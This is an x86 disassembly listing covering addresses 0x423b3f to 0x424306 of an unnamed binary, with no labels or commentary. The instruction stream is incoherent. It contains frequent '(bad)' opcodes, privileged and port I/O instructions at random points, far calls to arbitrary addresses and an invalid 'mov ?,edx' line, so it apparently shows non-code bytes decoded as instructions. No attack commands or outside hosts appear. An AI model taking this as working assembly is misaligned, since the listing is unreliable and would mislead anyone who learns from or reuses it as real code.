  423b3f:	mov    ax,ds:0x4c57d2eb
  423b45:	push   0xffffffed
  423b47:	mov    al,ds:0x9bb57b59
  423b4c:	dec    ecx
  423b4d:	push   esi
  423b4e:	das    
  423b4f:	pusha  
  423b50:	ret    0x1435
  423b53:	lock outs dx,BYTE PTR ds:[esi]
  423b55:	lods   al,BYTE PTR ds:[esi]
  423b56:	pop    edi
  423b57:	test   DWORD PTR [ecx-0x29cba17f],ecx
  423b5d:	cmc    
  423b5e:	pop    ebp
  423b5f:	xor    al,0xb0
  423b61:	sbb    edi,DWORD PTR [esi-0x64ef3c55]
  423b67:	loopne 0x423b6a
  423b69:	push   edi
  423b6a:	and    cl,BYTE PTR [ebx-0x5982fc17]
  423b70:	enter  0xb69d,0x46
  423b74:	popf   
  423b75:	push   es
  423b76:	cmp    esi,DWORD PTR [ecx-0x682cee91]
  423b7c:	leave  
  423b7d:	stos   BYTE PTR es:[edi],al
  423b7e:	mov    eax,DWORD PTR [ebx]
  423b80:	fdiv   QWORD PTR [edx+0x11]
  423b83:	pop    edx
  423b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b85:	push   ecx
  423b86:	ror    DWORD PTR [ebp-0x66],cl
  423b89:	fnstenv [edx]
  423b8b:	rcr    DWORD PTR [edi+eax*1-0x75],cl
  423b8f:	jo     0x423bf5
  423b91:	mov    ch,0x55
  423b93:	mov    al,0x6b
  423b95:	gs pop edx
  423b97:	jno    0x423b28
  423b99:	in     eax,0x40
  423b9b:	retf   0x9b41
  423b9e:	adc    eax,DWORD PTR [eax-0x4c0e3981]
  423ba4:	mov    cl,0x3d
  423ba6:	cli    
  423ba7:	jge    0x423c0b
  423ba9:	hlt    
  423baa:	jbe    0x423b5a
  423bac:	push   ebx
  423bad:	daa    
  423bae:	sbb    ebx,DWORD PTR [eax-0x28f73fd7]
  423bb4:	xor    eax,DWORD PTR [ecx+ebp*2-0x72a4787d]
  423bbb:	or     BYTE PTR [eax],bl
  423bbd:	lock (bad) 
  423bbf:	stos   DWORD PTR es:[edi],eax
  423bc0:	gs das 
  423bc2:	cwde   
  423bc3:	call   0x82dff46d
  423bc8:	ss jb  0x423c1e
  423bcb:	cwde   
  423bcc:	dec    esp
  423bcd:	inc    esi
  423bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bcf:	repnz push esp
  423bd1:	mov    ds:0x37fcd939,eax
  423bd6:	fbld   TBYTE PTR [ebp+ebx*4-0xc9694bf]
  423bdd:	fsubr  QWORD PTR [ebx-0x3a]
  423be0:	mov    bl,0x38
  423be2:	or     esi,edx
  423be4:	cmp    al,0xb8
  423be6:	mov    bl,0x75
  423be8:	xor    edx,DWORD PTR [ebp-0x51107c47]
  423bee:	sbb    DWORD PTR [edi-0x197cf4a0],0x4d2671b2
  423bf8:	push   ds
  423bf9:	icebp  
  423bfa:	add    eax,0xc1c47499
  423bff:	pop    ebp
  423c00:	sti    
  423c01:	mov    edx,0xdeef9d5a
  423c06:	mov    edx,0x1cf22178
  423c0b:	int    0xb7
  423c0d:	gs push ebx
  423c0f:	inc    ebp
  423c10:	pop    esi
  423c11:	push   esi
  423c12:	inc    edi
  423c13:	ins    BYTE PTR es:[edi],dx
  423c14:	cmp    al,0xf2
  423c16:	shl    BYTE PTR [esi-0x34f811f6],1
  423c1c:	adc    dl,BYTE PTR [eax-0x24]
  423c1f:	ret    0xbf4a
  423c22:	dec    edx
  423c23:	push   esi
  423c24:	sbb    esi,0xffffffcc
  423c27:	stc    
  423c28:	in     eax,0x6c
  423c2a:	(bad)  
  423c2b:	stc    
  423c2c:	dec    esi
  423c2d:	call   0x40ae78f0
  423c32:	and    dl,ch
  423c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c35:	bsr    eax,DWORD PTR [eax]
  423c38:	add    eax,0x2d6913e9
  423c3d:	mov    eax,0xee52f5c6
  423c42:	mov    ebp,0xf2583fb8
  423c47:	arpl   di,sp
  423c49:	inc    eax
  423c4a:	cwde   
  423c4b:	retf   
  423c4c:	jecxz  0x423c4b
  423c4e:	xchg   esi,eax
  423c4f:	xor    bh,BYTE PTR [edi-0x1effda57]
  423c55:	mov    ebp,0xbdbf3482
  423c5a:	iret   
  423c5b:	imul   BYTE PTR [eax+edi*4+0x12ef5b6b]
  423c62:	xchg   esp,eax
  423c63:	ud2    
  423c65:	dec    edi
  423c66:	inc    edx
  423c67:	mov    edi,0xa503edf9
  423c6c:	ins    BYTE PTR es:[edi],dx
  423c6d:	(bad)  
  423c6e:	sbb    al,bh
  423c70:	xchg   edx,eax
  423c71:	fnsave [esi+edx*2-0x39bee0d2]
  423c78:	fcomp  st(7)
  423c7a:	mov    edx,0x53c556be
  423c7f:	ins    DWORD PTR es:[edi],dx
  423c80:	inc    esp
  423c81:	inc    eax
  423c82:	fadd   DWORD PTR [eax+edx*8]
  423c85:	or     ch,BYTE PTR [esi+0x1b8b220f]
  423c8b:	push   ecx
  423c8c:	(bad)  
  423c8d:	lods   eax,DWORD PTR ds:[esi]
  423c8e:	and    DWORD PTR ds:0x93ba2577,edx
  423c94:	pop    edx
  423c95:	pop    ecx
  423c96:	stos   DWORD PTR es:[edi],eax
  423c97:	int    0xa8
  423c99:	cld    
  423c9a:	xor    al,BYTE PTR [edx-0x59ca0632]
  423ca0:	inc    ecx
  423ca1:	push   edi
  423ca2:	repz sub DWORD PTR [ecx-0x1d11b9f4],edx
  423ca9:	inc    esi
  423caa:	pop    ecx
  423cab:	and    BYTE PTR [edx-0xb],dh
  423cae:	mov    dl,0xdb
  423cb0:	mov    edi,DWORD PTR [esp+ebx*1-0x67]
  423cb4:	jg     0x423d31
  423cb6:	cmp    al,0xdf
  423cb8:	call   0x39fa729b
  423cbd:	adc    dh,cl
  423cbf:	push   eax
  423cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cc1:	inc    ebp
  423cc2:	cmp    esp,esp
  423cc4:	enter  0xd0e9,0x1e
  423cc8:	call   DWORD PTR [ebp-0x56]
  423ccb:	xlat   BYTE PTR ds:[ebx]
  423ccc:	or     BYTE PTR [esi-0xf745e27],ah
  423cd2:	dec    ecx
  423cd3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cd5:	call   0xfd5a:0xc35d7917
  423cdc:	je     0x423cdc
  423cde:	les    esp,FWORD PTR [esp+ebp*4]
  423ce1:	add    eax,0xf9371460
  423ce6:	pop    ebx
  423ce7:	inc    ebp
  423ce8:	pop    ss
  423ce9:	in     eax,dx
  423cea:	mov    ebx,0xd5e6f725
  423cef:	dec    ecx
  423cf0:	cmc    
  423cf1:	fcom   DWORD PTR [ecx+0x47]
  423cf4:	loop   0x423d56
  423cf6:	cmp    eax,0xf0078ad
  423cfb:	push   edi
  423cfc:	sbb    dl,BYTE PTR [ecx+0x44dd661d]
  423d02:	ja     0x423cb8
  423d04:	cmp    al,0xed
  423d06:	cmp    DWORD PTR [eax],0x72
  423d09:	mov    dl,0x96
  423d0b:	mov    BYTE PTR [edx+0x7a142b10],bh
  423d11:	in     eax,dx
  423d12:	je     0x423ccb
  423d14:	mov    ebx,0x3af1cf5d
  423d19:	sub    ebp,ebx
  423d1b:	add    eax,DWORD PTR [edx+eax*2+0x73]
  423d1f:	jne    0x423cf9
  423d21:	imul   esi,DWORD PTR [ecx-0x4ee43975],0x2d
  423d28:	div    ah
  423d2a:	mov    ch,0x4e
  423d2c:	in     eax,0x27
  423d2e:	add    cl,ah
  423d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d31:	test   al,0x5d
  423d33:	xor    esp,ebp
  423d35:	lock jns 0x423d61
  423d38:	cmp    BYTE PTR [ebp-0x1e],bh
  423d3b:	ror    BYTE PTR [ebx],1
  423d3d:	xchg   edx,eax
  423d3e:	rcr    DWORD PTR [ecx+0x5df570d0],1
  423d44:	mov    edx,0x17b6de66
  423d49:	mov    BYTE PTR [esi],dl
  423d4b:	fistp  QWORD PTR [edi]
  423d4d:	push   eax
  423d4e:	bound  edx,QWORD PTR [edx]
  423d50:	call   0xa7f9:0x18558c34
  423d57:	push   esi
  423d58:	fadd   st,st(3)
  423d5a:	rcr    esi,0x17
  423d5d:	fild   QWORD PTR [eax+eax*2+0x2d]
  423d61:	lods   eax,DWORD PTR ds:[esi]
  423d62:	mov    BYTE PTR [edx+esi*2+0x2b],dl
  423d66:	in     al,0xd2
  423d68:	jno    0x423d58
  423d6a:	xlat   BYTE PTR ds:[ebx]
  423d6b:	out    0xc0,al
  423d6d:	cmp    cl,dl
  423d6f:	xor    al,0x65
  423d71:	add    al,0xe8
  423d73:	mov    esi,0xb120cf6b
  423d78:	fs jne 0x423d69
  423d7b:	ret    
  423d7c:	ss test al,0xd7
  423d7f:	sahf   
  423d80:	test   eax,0x84b649d4
  423d85:	retf   0xc4b0
  423d88:	mov    ecx,0xa96dae1d
  423d8d:	inc    esi
  423d8e:	popf   
  423d8f:	and    al,0x67
  423d91:	jne    0x423dfd
  423d93:	int    0x2c
  423d95:	mov    WORD PTR [eax+0x453c4199],ds
  423d9b:	add    DWORD PTR [eax],esp
  423d9d:	add    al,0x85
  423d9f:	push   0x47c78a15
  423da4:	jae    0x423e03
  423da6:	fwait
  423da7:	and    ecx,DWORD PTR [edx-0x6c]
  423daa:	sahf   
  423dab:	cld    
  423dac:	cdq    
  423dad:	lods   al,BYTE PTR ds:[esi]
  423dae:	mov    DWORD PTR [edx],esi
  423db0:	add    ebx,DWORD PTR [edx+0x34]
  423db3:	cli    
  423db4:	loopne 0x423de7
  423db6:	jo     0x423d77
  423db8:	shl    BYTE PTR [eax+edx*4],0x65
  423dbc:	adc    edx,ebp
  423dbe:	test   DWORD PTR [eax],edx
  423dc0:	xchg   ebp,eax
  423dc1:	dec    esi
  423dc2:	int3   
  423dc3:	sti    
  423dc4:	mov    edi,0x5c5a09bc
  423dc9:	idiv   bh
  423dcb:	into   
  423dcc:	pop    edx
  423dcd:	test   DWORD PTR [esi+0x6e],0x7625bee1
  423dd4:	outs   dx,DWORD PTR ds:[esi]
  423dd5:	outs   dx,DWORD PTR ds:[esi]
  423dd6:	fucomi st,st(2)
  423dd8:	dec    esi
  423dd9:	test   eax,0x914b7183
  423ddf:	pop    es
  423de0:	mov    edx,0x81bd1ae2
  423de5:	dec    edx
  423de6:	xchg   edi,eax
  423de7:	xchg   ebp,eax
  423de8:	or     DWORD PTR [esi],0xffffffdf
  423deb:	xor    esi,DWORD PTR [ebp-0x7a]
  423dee:	mov    WORD PTR [ebp+0x10],cs
  423df1:	test   BYTE PTR [ecx-0x57],al
  423df4:	ror    DWORD PTR [edi-0x27],1
  423df7:	xor    dl,BYTE PTR [edx-0x1f]
  423dfa:	in     eax,0xd8
  423dfc:	adc    DWORD PTR [ecx],ebx
  423dfe:	sbb    DWORD PTR ds:0x5bb33215,esi
  423e04:	mov    al,ds:0xf7e3e3d4
  423e09:	add    eax,0xe6e03a86
  423e0e:	sub    al,0x0
  423e10:	xor    eax,0x7536c361
  423e15:	int3   
  423e16:	push   edi
  423e17:	jp     0x423e63
  423e19:	stos   DWORD PTR es:[edi],eax
  423e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e1b:	or     eax,0x93c22680
  423e20:	addr16 aaa 
  423e22:	add    eax,ebx
  423e24:	ror    BYTE PTR [edx+0x711eaf54],cl
  423e2a:	jo     0x423e0d
  423e2c:	inc    esi
  423e2d:	adc    al,0xe
  423e2f:	imul   ebx,eax,0x6f
  423e32:	je     0x423e6c
  423e34:	sbb    DWORD PTR [edx],0xcf47323d
  423e3a:	sbb    ebx,eax
  423e3c:	jl     0x423dd6
  423e3e:	fisubr DWORD PTR [ebx+edx*4-0x7652785b]
  423e45:	mov    al,ds:0xc4d2ff73
  423e4a:	mov    esp,0x126643e9
  423e4f:	jae    0x423e07
  423e51:	shl    DWORD PTR [edx],1
  423e53:	(bad)  
  423e55:	(bad)  
  423e56:	je     0x423e79
  423e58:	das    
  423e59:	aad    0x48
  423e5b:	jmp    0xf751:0x7eb0839b
  423e62:	sub    BYTE PTR [ecx-0x5ddf5870],bl
  423e68:	sbb    dh,cl
  423e6a:	iret   
  423e6b:	mul    bh
  423e6d:	xlat   BYTE PTR ds:[ebx]
  423e6e:	mov    al,ds:0x45bd27eb
  423e73:	xor    cl,BYTE PTR [eax+0x1f1f353f]
  423e79:	aaa    
  423e7a:	stos   DWORD PTR es:[edi],eax
  423e7b:	jbe    0x423e63
  423e7d:	mov    bl,0xa5
  423e7f:	push   es
  423e80:	xchg   ebx,eax
  423e81:	sahf   
  423e82:	clc    
  423e83:	mov    WORD PTR [ebp+ecx*1-0x57df0316],ss
  423e8a:	xchg   edi,eax
  423e8b:	xchg   edx,eax
  423e8c:	xlat   BYTE PTR ds:[ebx]
  423e8d:	repnz dec ebx
  423e8f:	add    ecx,DWORD PTR [esi-0x7a]
  423e92:	mov    bh,0x1d
  423e94:	sub    eax,0xe8264d13
  423e99:	fild   DWORD PTR [edi+ecx*1+0x5daca8ce]
  423ea0:	loop   0x423e4c
  423ea2:	dec    eax
  423ea3:	pop    ss
  423ea4:	lock pushf 
  423ea6:	mov    edx,ecx
  423ea8:	jae    0x423eca
  423eaa:	pop    ss
  423eab:	cmp    BYTE PTR [ecx+0x47bddace],bl
  423eb1:	mov    ebp,0x9dfcbbad
  423eb6:	sub    ah,BYTE PTR [ecx]
  423eb8:	in     eax,dx
  423eb9:	loop   0x423e6a
  423ebb:	iret   
  423ebc:	sbb    al,0x7f
  423ebe:	fwait
  423ebf:	stc    
  423ec0:	retf   
  423ec1:	cld    
  423ec2:	scas   al,BYTE PTR es:[edi]
  423ec3:	es ret 0xdac
  423ec7:	fsubr  DWORD PTR [ebx-0x12]
  423eca:	jae    0x423e65
  423ecc:	and    bh,cl
  423ece:	sub    al,dl
  423ed0:	adc    esp,edx
  423ed2:	or     BYTE PTR [edi-0x2814fa21],bh
  423ed8:	int3   
  423ed9:	out    0x79,al
  423edb:	dec    ebp
  423edc:	or     ah,BYTE PTR [ebx+0x40]
  423edf:	mov    ch,0x97
  423ee1:	mov    ch,dh
  423ee3:	push   esp
  423ee4:	push   eax
  423ee5:	sbb    al,0x55
  423ee7:	out    0x9c,eax
  423ee9:	(bad)  
  423eeb:	popf   
  423eec:	xor    eax,DWORD PTR [eax-0x1510b748]
  423ef2:	fisub  DWORD PTR [ebx+eax*1]
  423ef5:	adc    al,BYTE PTR ds:0xd305cde8
  423efb:	mov    al,ds:0x1711e717
  423f00:	lahf   
  423f01:	add    BYTE PTR [eax+0x0],bh
  423f04:	sub    BYTE PTR [eax],bh
  423f06:	jo     0x423f0e
  423f08:	pop    ds
  423f09:	dec    ecx
  423f0a:	fadd   QWORD PTR [edx]
  423f0c:	call   0x71fd:0xbbef1f7d
  423f13:	fidivr DWORD PTR [esi-0x1fb53d9c]
  423f19:	(bad)  
  423f1b:	dec    ecx
  423f1c:	inc    esi
  423f1d:	dec    esi
  423f1e:	std    
  423f1f:	(bad)  
  423f20:	add    DWORD PTR [esi-0x78],esi
  423f23:	xor    edx,DWORD PTR [eax+0x0]
  423f26:	repz xchg esp,eax
  423f28:	adc    DWORD PTR [edi+0x597a3ff1],eax
  423f2e:	xlat   BYTE PTR ds:[ebx]
  423f2f:	mov    al,0x10
  423f31:	xchg   ebx,eax
  423f32:	mov    esi,0xf850f198
  423f37:	in     eax,dx
  423f38:	mov    ch,0xf
  423f3a:	mov    edi,0x10937770
  423f3f:	or     BYTE PTR [ecx+0x2a048419],ah
  423f45:	push   0xfffffff1
  423f47:	xor    bl,BYTE PTR [ecx-0x78]
  423f4a:	pop    ecx
  423f4b:	sub    BYTE PTR [ebp+0x76824b77],0xe4
  423f52:	mov    ?,edx
  423f54:	xor    edi,DWORD PTR [edi]
  423f56:	sbb    DWORD PTR [ecx+0x29],ecx
  423f59:	das    
  423f5a:	jb     0x423f09
  423f5c:	inc    ebx
  423f5d:	lahf   
  423f5e:	and    ch,0x70
  423f61:	fs jle 0x423fad
  423f64:	push   es
  423f65:	ja     0x423f87
  423f67:	add    dl,BYTE PTR ds:0xca5adeed
  423f6d:	mov    cl,0x1d
  423f6f:	je     0x423f61
  423f71:	and    ah,0xa5
  423f74:	in     al,dx
  423f75:	gs xor al,0xd2
  423f78:	shl    DWORD PTR [ecx+ecx*4+0x48],cl
  423f7c:	(bad)  
  423f7e:	ret    
  423f7f:	out    dx,eax
  423f80:	xchg   ecx,eax
  423f81:	xor    al,0xb1
  423f83:	mov    ebp,0x5c83f369
  423f88:	mov    ds:0x3a786ad2,al
  423f8d:	(bad)  
  423f8e:	sub    ebx,esp
  423f90:	scas   al,BYTE PTR es:[edi]
  423f91:	arpl   WORD PTR [edx+0x3d],sp
  423f94:	aad    0x49
  423f96:	adc    DWORD PTR [ebp-0x14],edi
  423f99:	imul   eax
  423f9b:	mov    ecx,0x68f7ed7e
  423fa0:	ins    BYTE PTR es:[edi],dx
  423fa1:	sub    cl,ah
  423fa3:	jno    0x423f93
  423fa5:	out    0xb7,eax
  423fa7:	(bad)  
  423fa8:	jge    0x423f45
  423faa:	xchg   esp,eax
  423fab:	outs   dx,DWORD PTR ds:[esi]
  423fac:	ret    
  423fad:	pushw  es
  423faf:	jbe    0x423f8c
  423fb1:	ins    DWORD PTR es:[edi],dx
  423fb2:	jne    0x424016
  423fb4:	shl    DWORD PTR [ebx],1
  423fb6:	test   BYTE PTR [ecx+0x6d596e33],0x9c
  423fbd:	xchg   BYTE PTR ds:0x5efcb755,cl
  423fc3:	jbe    0x423fa1
  423fc5:	lds    eax,FWORD PTR [edx-0x72dc8aca]
  423fcb:	push   ss
  423fcc:	cs jbe 0x424044
  423fcf:	idiv   BYTE PTR [edi]
  423fd1:	jae    0x423faa
  423fd3:	fist   DWORD PTR [ecx+0x6cab734d]
  423fd9:	xchg   edx,eax
  423fda:	adc    BYTE PTR [eax],ch
  423fdc:	fldenv [ebp+eiz*2+0x3e872ede]
  423fe3:	jo     0x424046
  423fe5:	scas   al,BYTE PTR es:[edi]
  423fe6:	imul   ebp,DWORD PTR [ebp+0x49],0x22
  423fea:	cli    
  423feb:	mov    cl,0x32
  423fed:	stc    
  423fee:	jb     0x423f94
  423ff0:	mov    eax,edx
  423ff2:	xor    BYTE PTR [eax-0x7e],ah
  423ff5:	stc    
  423ff6:	push   es
  423ff7:	xchg   esp,eax
  423ff8:	outs   dx,BYTE PTR ds:[esi]
  423ff9:	sbb    eax,0x7d9bab18
  423ffe:	xchg   esi,eax
  423fff:	xor    ebp,DWORD PTR [ecx+0x5c]
  424002:	push   0x9077da
  424007:	adc    eax,DWORD PTR [ebx]
  424009:	int    0x38
  42400b:	mov    ebx,0x2e0fa4ef
  424010:	xchg   ebp,eax
  424011:	outs   dx,DWORD PTR ds:[esi]
  424012:	sbb    al,0xf8
  424014:	or     DWORD PTR [ecx+edx*8+0x77],0x102fcd01
  42401c:	or     BYTE PTR ds:0x4bd23c5c,ah
  424022:	xchg   ebp,eax
  424023:	sbb    DWORD PTR [ebp-0x5414d6ef],0xa4c44bfe
  42402d:	mov    al,0xa0
  42402f:	add    DWORD PTR [esi-0x65],ebp
  424032:	aaa    
  424033:	or     ebp,DWORD PTR [eax]
  424035:	mov    ds:0x96076799,al
  42403a:	(bad)  
  42403b:	jp     0x424042
  42403d:	aas    
  42403e:	int3   
  42403f:	(bad)  
  424041:	mov    ebp,0xd1508d26
  424046:	fidivr DWORD PTR [ebx+0x36]
  424049:	(bad)  
  42404a:	in     eax,dx
  42404b:	push   ds
  42404c:	imul   esi,edx,0xd50237d8
  424052:	ja     0x423fed
  424054:	dec    ebp
  424055:	loop   0x424016
  424057:	(bad)  
  424058:	and    BYTE PTR [ebp-0x17c0899a],ch
  42405e:	lods   al,BYTE PTR ds:[esi]
  42405f:	out    0x95,eax
  424061:	mov    esi,0x306fa558
  424066:	sub    eax,0x14634dfd
  42406b:	popf   
  42406c:	repz test al,0xc0
  42406f:	aaa    
  424070:	or     BYTE PTR [edi+0xaee0428],ch
  424076:	xor    BYTE PTR [eax+0x371ba590],ah
  42407c:	sbb    dh,ch
  42407e:	sub    edi,DWORD PTR [ebx-0x62]
  424081:	push   es
  424082:	icebp  
  424083:	lods   eax,DWORD PTR ds:[esi]
  424084:	pop    di
  424086:	cmp    BYTE PTR [ebp+0xf],bl
  424089:	scas   eax,DWORD PTR es:[edi]
  42408a:	ja     0x424064
  42408c:	jecxz  0x4240f1
  42408e:	mov    BYTE PTR [ecx+0x239b77c9],cl
  424094:	(bad)  
  424095:	push   esi
  424096:	sbb    ah,cl
  424098:	pop    eax
  424099:	mov    edi,0xfa2729f
  42409e:	test   DWORD PTR [esi-0x33d16c99],edx
  4240a4:	shl    bl,0x61
  4240a7:	mov    ecx,DWORD PTR [edx]
  4240a9:	and    ebx,DWORD PTR [eax-0x14]
  4240ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240ad:	pop    esp
  4240ae:	test   eax,0x1de408df
  4240b3:	jns    0x42408a
  4240b5:	into   
  4240b6:	xor    DWORD PTR [edi+0x776b7b7a],0x27
  4240bd:	pop    ds
  4240be:	(bad)  
  4240c0:	cmp    BYTE PTR [eax-0x16de57b1],0x37
  4240c7:	adc    eax,0x94101d0e
  4240cc:	adc    DWORD PTR [ecx+eax*1],edx
  4240cf:	add    ecx,DWORD PTR [eax+0x323efe8e]
  4240d5:	call   0x1016ec8b
  4240da:	int3   
  4240db:	fdivr  DWORD PTR [ebx+edx*8+0x29]
  4240df:	fcomp  QWORD PTR [ebp-0x69bce8cf]
  4240e5:	or     esi,DWORD PTR [ecx-0x34b5b0f4]
  4240eb:	cwde   
  4240ec:	or     dh,BYTE PTR [edi-0x68a1ca34]
  4240f2:	push   es
  4240f3:	push   ss
  4240f4:	inc    ebx
  4240f5:	add    BYTE PTR [eax],cl
  4240f7:	sahf   
  4240f8:	mov    edi,0x5880ebf0
  4240fd:	pop    edx
  4240fe:	rcl    DWORD PTR [eax+0x20],cl
  424101:	icebp  
  424102:	dec    edx
  424103:	jl     0x424116
  424105:	rol    DWORD PTR [esp+edi*8],1
  424108:	add    ah,al
  42410a:	repz jl 0x424181
  42410d:	fs ss ret 0xa16c
  424112:	xchg   edx,eax
  424113:	mov    ebx,0x4f9b1c8c
  424118:	std    
  424119:	loope  0x42410b
  42411b:	pop    eax
  42411c:	sbb    eax,0x326200dc
  424121:	or     eax,0x7aae13d7
  424126:	xlat   BYTE PTR ds:[ebx]
  424127:	fwait
  424128:	pop    es
  424129:	call   0x74572902
  42412e:	push   ebp
  42412f:	add    ch,dh
  424131:	bound  ecx,QWORD PTR [ebp+0x17]
  424134:	fucomi st,st(7)
  424136:	xor    BYTE PTR [ebx-0x6e],al
  424139:	cmp    eax,0x9c735eaf
  42413e:	(bad)  
  42413f:	sahf   
  424140:	ins    BYTE PTR es:[edi],dx
  424141:	mov    edi,0xee230d24
  424146:	sahf   
  424147:	pushfw 
  424149:	imul   esp,DWORD PTR [eax-0x4619a4d8],0x7d
  424150:	ss inc esi
  424152:	inc    edi
  424153:	adc    dh,BYTE PTR [ecx+0x470347c9]
  424159:	inc    esi
  42415a:	inc    esi
  42415b:	stos   DWORD PTR es:[edi],eax
  42415c:	(bad)  
  42415d:	popa   
  42415e:	mov    ecx,edx
  424160:	mov    ebp,0x4512a5da
  424165:	push   esp
  424166:	pop    eax
  424167:	sub    BYTE PTR ss:[edx],cl
  42416a:	mov    ch,0x26
  42416c:	les    ebp,FWORD PTR [ebx+ebx*8+0x42]
  424170:	or     al,0xe9
  424172:	dec    eax
  424173:	neg    DWORD PTR [si-0x4705]
  424178:	dec    eax
  424179:	xor    al,0x28
  42417b:	push   esp
  42417c:	sbb    DWORD PTR [esi-0x4ad86662],0xa814e83a
  424186:	or     ebx,DWORD PTR [edx+0xf]
  424189:	push   ebx
  42418a:	addr16 dec ebp
  42418c:	pop    esi
  42418d:	outs   dx,BYTE PTR ds:[esi]
  42418e:	lds    edx,FWORD PTR [edx-0x7c]
  424191:	jbe    0x4241fb
  424193:	out    dx,al
  424194:	push   ss
  424195:	jno    0x42415b
  424197:	cmp    al,0xf0
  424199:	(bad)  
  42419a:	not    DWORD PTR [edi-0x79810cde]
  4241a0:	test   al,0xbb
  4241a2:	pop    ecx
  4241a3:	cld    
  4241a4:	push   0xffffffcb
  4241a6:	inc    edx
  4241a7:	xor    ebp,DWORD PTR [ebp+ebp*4-0x38379f60]
  4241ae:	ins    DWORD PTR es:[edi],dx
  4241af:	cdq    
  4241b0:	adc    al,0x13
  4241b2:	adc    esi,DWORD PTR [ecx+0x15]
  4241b5:	pop    eax
  4241b6:	mov    ch,BYTE PTR [edi+0x34]
  4241b9:	outs   dx,DWORD PTR ds:[esi]
  4241ba:	scas   al,BYTE PTR es:[edi]
  4241bb:	test   al,0x52
  4241bd:	mov    BYTE PTR [esi-0x4b],0x61
  4241c1:	pop    ebp
  4241c2:	(bad)  
  4241c3:	enter  0x3dde,0xb8
  4241c7:	cmp    al,ch
  4241c9:	cmp    ebp,DWORD PTR [edx+0x3a667239]
  4241cf:	and    eax,0x8deadb6c
  4241d4:	out    0x4c,eax
  4241d6:	aas    
  4241d7:	hlt    
  4241d8:	sbb    eax,0xa6e72d26
  4241dd:	inc    edi
  4241de:	mov    edi,ebp
  4241e0:	dec    esi
  4241e1:	inc    edi
  4241e2:	jo     0x4241fc
  4241e4:	imul   ecx,ecx,0x7367decb
  4241ea:	pop    ss
  4241eb:	cmc    
  4241ec:	aas    
  4241ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241ee:	sub    ebp,DWORD PTR [ecx+0x6fedc101]
  4241f4:	mov    ds,ebp
  4241f6:	push   ss
  4241f7:	sbb    DWORD PTR [ebp+0x4d],0xffffffb0
  4241fb:	jl     0x4241ad
  4241fd:	repnz popf 
  4241ff:	inc    eax
  424200:	pop    esp
  424201:	ins    BYTE PTR es:[edi],dx
  424202:	out    0x62,al
  424204:	push   edi
  424205:	or     al,0xa9
  424207:	pop    esp
  424208:	push   esi
  424209:	sbb    DWORD PTR ds:[eax],esi
  42420c:	mov    ds:0xbbf63c4b,eax
  424211:	sbb    al,0x35
  424213:	imul   esp,DWORD PTR [ebp+ecx*1-0x16bd8254],0x9a5c3ae
  42421e:	mov    ebx,0x5ad167f4
  424223:	xchg   esp,eax
  424224:	mov    ecx,DWORD PTR [ebx-0x5e]
  424227:	jecxz  0x424227
  424229:	outs   dx,DWORD PTR ds:[esi]
  42422a:	xor    eax,esp
  42422c:	lock sub BYTE PTR [ecx],ah
  42422f:	inc    edi
  424230:	cmc    
  424231:	mov    eax,0x102e3540
  424236:	pop    esp
  424237:	and    cl,dl
  424239:	mov    eax,ds:0x41c3cc9e
  42423e:	mov    ah,0xc
  424240:	or     DWORD PTR [ecx+esi*1+0x5ea7da5f],0x20
  424248:	xchg   DWORD PTR [ebx+0x29],edi
  42424b:	adc    eax,0x7882286b
  424250:	sub    BYTE PTR [ebx+0x1ff0082e],bh
  424256:	jecxz  0x4242bf
  424258:	push   esi
  424259:	inc    esp
  42425a:	(bad)  
  42425b:	scas   eax,DWORD PTR es:[edi]
  42425c:	xchg   esi,eax
  42425d:	fdiv   QWORD PTR [ecx]
  42425f:	or     eax,0x65c90c3
  424264:	call   FWORD PTR [edx-0x55]
  424267:	stc    
  424268:	in     eax,0x80
  42426a:	test   ebp,0xf30fe40d
  424270:	xchg   BYTE PTR [edi+0x5574b0aa],dl
  424276:	mov    eax,ds:0xcb4c9045
  42427b:	repnz fistp WORD PTR [edx+edx*1-0x31]
  424280:	xor    DWORD PTR ds:0x333b5d2f,esi
  424286:	lds    edi,FWORD PTR [esi+0xb1719b0]
  42428c:	adc    bh,cl
  42428e:	fcomi  st,st(7)
  424290:	(bad)
  424293:	or     DWORD PTR [ecx-0x3ea35ccc],ecx
  424299:	aas    
  42429a:	adc    bh,BYTE PTR [ebx+0x2d]
  42429d:	daa    
  42429e:	push   ebp
  42429f:	stos   DWORD PTR es:[edi],eax
  4242a0:	and    BYTE PTR [ebx],dl
  4242a2:	or     al,0xef
  4242a4:	aam    0x44
  4242a6:	std    
  4242a7:	scas   eax,DWORD PTR es:[edi]
  4242a8:	cdq    
  4242a9:	inc    ecx
  4242aa:	dec    esi
  4242ab:	add    cl,dl
  4242ad:	mov    ds:0xc9ef8073,al
  4242b2:	pushf  
  4242b3:	dec    ecx
  4242b4:	iret   
  4242b5:	arpl   bp,si
  4242b7:	xchg   edx,eax
  4242b8:	fdivp  st(4),st
  4242ba:	pop    ebx
  4242bb:	loope  0x424252
  4242bd:	jne    0x424263
  4242bf:	xor    esi,DWORD PTR [ecx-0xbed63c1]
  4242c5:	fist   WORD PTR [ebx-0x192f64e9]
  4242cb:	out    0x32,al
  4242cd:	jno    0x4242d4
  4242cf:	jmp    0x7b918e49
  4242d4:	in     eax,0xc6
  4242d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d7:	cmp    eax,0x3f3c37d1
  4242dc:	mov    bl,0x19
  4242de:	push   edi
  4242df:	xor    eax,0x69e2cf02
  4242e4:	in     al,dx
  4242e5:	cli    
  4242e6:	cmp    ebx,DWORD PTR [esi]
  4242e8:	cwde   
  4242e9:	pop    ds
  4242ea:	xchg   al,bh
  4242ec:	push   eax
  4242ed:	fwait
  4242ee:	popf   
  4242ef:	xor    DWORD PTR [ebx-0xa10da49],ebp
  4242f5:	and    al,0x9b
  4242f7:	cli    
  4242f8:	call   0x26985638
  4242fd:	les    esp,FWORD PTR [ebx-0x2f]
  424300:	not    edi
  424302:	push   ds
  424303:	aad    0x23
  424305:	aaa    
  424306:	inc    ecx
